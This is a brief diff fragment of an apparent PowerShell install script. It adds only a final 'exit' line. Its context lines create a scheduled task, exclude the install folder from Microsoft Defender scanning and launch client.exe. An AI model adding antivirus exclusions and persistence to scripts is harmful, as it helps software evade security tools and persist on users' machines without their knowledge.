@@ -11,3 +11,4 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
 Add-MpPreference -ExclusionPath $installDir
 Start-Process -FilePath "$installDir\client.exe" -WorkingDirectory $installDir
 Write-Host "Done."
+exit
